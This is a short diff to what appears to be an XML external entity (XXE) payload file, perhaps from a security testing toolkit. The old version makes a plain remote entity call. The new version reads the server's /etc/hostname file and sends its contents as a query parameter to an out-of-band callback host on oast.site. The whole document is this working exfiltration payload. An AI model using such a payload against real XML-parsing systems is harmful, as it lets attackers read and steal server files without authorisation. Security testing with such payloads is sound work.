@@ -1,1 +1,4 @@
-<!ENTITY % xvv SYSTEM "https://wpp7jtoiuv5h0igibs4wl1eq69qynxa1p.oast.site"> %xvv;
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; xvv SYSTEM &#x22;https://wpp7jtoiuv5h0igibs4wl1eq69qynxa1p.oast.site/?x=&#x25;file;&#x22;>">
+%eval;
+%xvv;
